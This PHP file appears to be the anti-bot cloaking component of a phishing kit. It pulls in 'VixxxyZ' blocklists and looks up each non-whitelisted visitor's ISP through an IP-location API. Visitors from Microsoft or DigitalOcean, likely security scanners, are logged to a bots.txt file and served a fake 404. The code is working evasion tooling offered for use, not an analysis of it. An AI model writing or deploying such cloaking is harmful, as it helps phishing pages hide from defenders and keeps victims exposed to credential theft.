<?php

include'../../string.php';

include'../VixxxyZ/blocklist.php';
// include'admin/VixxxyZ/vixxyz1.php';
include'..//VixxxyZ/vixxyz2.php';
include'../VixxxyZ/vixxyz3.php';
include'../VixxxyZ/vixxyz4.php';
include'../VixxxyZ/vixxxyz5.php';
include'../settings.php';

if($_SESSION['ip']==$whitelisted_ip){

}else{
$ch=curl_init(); 
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_URL,"https://api.iplocation.net/?ip=".$_SESSION['ip']);
curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
curl_setopt($ch,CURLOPT_TIMEOUT,400);
$json=curl_exec($ch);
 $json2 = json_decode($json);
$ip_type = $json2->isp;
if($ip_type=="Microsoft Corporation"){
    $content = "#> ".$_SESSION['ip']." [ MICROSOFT  ] \r\n";
    $save=fopen("../bots.txt","a+");
    fwrite($save,$content);
    fclose($save);
    header("HTTP/1.0 404 Not Found");exit();

}
if($ip_type=="DigitalOcean LLC"){
    $content = "#> ".$_SESSION['ip']." [ Digital ocean  ] \r\n";
    $save=fopen("../bots.txt","a+");
    fwrite($save,$content);
    fclose($save);
    header("HTTP/1.0 404 Not Found");exit();

}
}



header("HTTP/1.0 404 Not Found");exit();


                

?>